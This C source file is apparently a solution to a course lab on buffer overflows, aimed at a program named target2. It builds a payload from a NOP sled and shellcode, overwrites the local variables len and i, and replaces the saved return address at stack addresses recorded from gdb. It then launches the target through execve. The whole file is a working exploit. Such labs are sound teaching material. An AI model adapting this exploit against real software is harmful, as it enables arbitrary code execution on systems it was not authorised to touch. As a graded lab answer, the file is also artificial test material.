#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

// rip counter from foo is stored in 0x3021fe98
// p &buf : $1 = (char (*)[256]) 0x3021fd80
// p &i : $2 = (int *) 0x3021fe8c
// p &len : $3 = (int *) 0x3021fe88

#define TARGET "../targets/target2"
#define BUFFER_SIZE 285
#define NOP 0x90
#define RETURN_ADDRESS "\x80\xfd\x21\x30"
#define LEN_ADDRESS "\x1c\x01\x00\x00"
#define I_ADDRESS "\x17\x01\x01\x01"

int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[2];

	char bufferExploit[BUFFER_SIZE];

	// Fill the buffer exploit with NOPs and shellcode
	memset(bufferExploit, NOP, BUFFER_SIZE);
	memcpy(bufferExploit, shellcode, strlen(shellcode));
	
	// Write addresses for i, len and the return
	memcpy(&bufferExploit[264], LEN_ADDRESS, 4);
	memcpy(&bufferExploit[268], I_ADDRESS, 4);
	memcpy(&bufferExploit[280], RETURN_ADDRESS, 4);
	
	// Add '\0' for the last entry
	bufferExploit[284] = '\0';

	args[0] = TARGET;
	//args[1] = "hi there";
	args[1] = bufferExploit;
	args[2] = NULL;

	env[0] = "\x00";
	env[1] = &bufferExploit[268];

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
